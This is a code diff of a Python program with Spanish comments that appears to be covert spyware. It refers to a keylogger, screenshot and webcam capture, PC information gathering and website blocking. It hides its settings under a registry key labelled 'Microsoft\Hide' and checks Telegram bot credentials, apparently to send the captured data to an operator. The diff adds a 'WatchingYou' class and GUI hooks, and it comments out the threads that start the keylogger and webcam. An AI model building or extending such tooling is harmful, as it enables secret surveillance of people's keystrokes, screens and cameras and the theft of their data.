@@ -77,13 +77,15 @@ class WinRegistry:
             pass
 
     def read_value(self, nameValue):
-        # Open key
-        opened_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.afterPath, 0,
-                                    winreg.KEY_ALL_ACCESS)  # Error if key is emply
-        # Create value
-        f = winreg.QueryValueEx(opened_key, nameValue)
-        print(f[0])
-        return f[0]
+        try:
+            # Open key
+            opened_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.afterPath, 0,winreg.KEY_ALL_ACCESS)  # Error if key is emply
+            # Create value
+            f = winreg.QueryValueEx(opened_key, nameValue)
+            print(f[0])
+            return f[0]
+        except:
+            return False
 
     def set_value_String(self, nameValue, value):
         self.__create_value(winreg.REG_SZ, nameValue, value)
@@ -106,8 +108,7 @@ class WinRegistry:
     def delete_value(self, nameValue):
         try:
             # Open key
-            opened_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.afterPath, 0,
-                                        winreg.KEY_ALL_ACCESS)  # Error if key is emply
+            opened_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.afterPath, 0, winreg.KEY_ALL_ACCESS)  # Error if key is emply
             # Create value
             winreg.DeleteValue(opened_key, nameValue)
         except:
@@ -571,6 +572,7 @@ class PCInformation:
                     init()
                     time.sleep(int(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value('interval')))
 
+
 class WebCam_IA:
     def __init__(self):
         self.frontalFacePath = "haarcascade_frontalface_default.xml"  # Archivo clasificador
@@ -664,9 +666,50 @@ class WebCam_IA:
             else:
                 print('No se puedo acceder a la webcam o al archivo entrenado')
         init(num)
+
+
+class WatchingYou:
+    def write_reg_init(self):
+        if self.__check_reg() == False:
+            ## Escrbiir en el registro
+            pass
+
+
+    def check_id(self, fullname, chat_id):
+        token = str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').read_value('token'))
+        bot = telepot.Bot(token)
+        for id in chat_id:
+            try:
+                bot.sendMessage(id, "test send")
+                print("ID and Token Success " + str(id))
+                self.__write_id(fullname, chat_id)
+                return True
+            except:
+                print("Was there mistake in ID: " + str(id) + " or Token: " + str(token))
+                return False
+    def __check_reg(self):
+        return WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('fullname')
+
+    def __write_id(self, fullname, chat_id):
+        WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').set_value_String('fullname', fullname)
+        WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').set_value_MultiString('id',chat_id)
+
+    def active(self):
+        pass
+
+    def desactive(self):
+        pass
+
+
 if __name__ == '__main__':
+
+    if WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('fullname') == False:
+        print('no existe, crear datos en el registro')
+    else :
+        print('si se encontró el username ')
+
     folders = [
-        # str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('path')),
+        str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('sub_path')),
         str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot').read_value('path')),
         str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\WebCam').read_value('path')),
         str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value('path'))
@@ -675,6 +718,7 @@ if __name__ == '__main__':
         Util().delete_folder(f)  # Remove foldes and files // Cache
         Util().create_folder(f)  # Create folders for cache
 
+    """
     time.sleep(1)
     # Eliminar todas las carpetas
     threading.Thread(target=Keylogger().listen_key).start()
@@ -683,17 +727,17 @@ if __name__ == '__main__':
     # Verifica permisos de admistrador: Administrador
     WebCam_IA().start()
     """
-    eel.init('web') # Nombre de la carpeta
+
+    eel.init('web')     # Nombre de la carpeta
 
     @eel.expose
-    def send_values(nickname, tele_id):
-        Util().create_folder(Config().TEMP) #Crea carpeta temporal
-
-
-        tScreenshot = threading.Thread(target=Screenshot().send)
-        tScreenshot.start()
+    def start_software():
 
         print("Is Admin?: Admin Sucess" if Util().is_admin() else "Is Admin?: Admin Failed")
+
+
+
+        """
         threading.Thread(target=WebsiteBlock().block).start() if Util().is_admin() else False  # Bloquear Webs
         threading.Thread(target=WebsiteBlock().reset()).start() if Util().is_admin() else False  # Desbloquear Webs
         print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
@@ -702,10 +746,9 @@ if __name__ == '__main__':
         threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
 
         WebCam_IA().start()
-        print(nickname)
-        print(tele_id)
+        """
         print("Está en linea")
-        return ""
+        return True
 
     @eel.expose
     def stop___(): # Detiene todo el proceso
@@ -713,12 +756,10 @@ if __name__ == '__main__':
         print('se detuvo')
         return ""
 
-
     @eel.expose
     def start___():  # Inicia todo el proceso
         print('continuar')
         return ""
-
 
     @eel.expose
     def exit___(self):  # Inicia todo el proceso
@@ -726,8 +767,19 @@ if __name__ == '__main__':
         os._exit(1)
         return ""
 
+    @eel.expose
+    def retorno(d):  # Inicia todo el proceso
+        print('funcion retorno actvado ')
+        return "true"
+
+    @eel.expose
+    def check_id(chat_id, fullname):  # Inicia todo el proceso
+        WatchingYou().write_reg_init()
+        print(chat_id)
+        return WatchingYou().check_id(fullname, [chat_id])
 
 
-    eel.start('index.html',  size=(1000, 600))
-    """
+
+    eel.start('index.html',  size=(950, 600))
+
 
